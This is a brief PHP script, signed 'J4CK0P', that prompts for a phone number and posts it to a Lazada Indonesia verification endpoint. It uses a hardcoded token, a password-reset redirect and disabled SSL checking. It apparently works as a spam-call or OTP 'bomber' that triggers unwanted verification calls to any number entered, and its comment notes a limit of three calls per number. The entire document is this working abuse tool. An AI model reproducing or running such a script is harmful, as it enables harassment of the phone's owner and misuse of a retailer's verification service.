<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://my-m.lazada.co.id/member/verify?hybrid=1&redirect=https%3A%2F%2Fmember-m.lazada.co.id%2Fuser%2Freset-password&token=36cffd14-ef5f-40ac-ac5b-010973f2ac5d&type=COMMON_VERIFICATION");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=message");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "COPYRIGHT ; J4CK0P\n\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
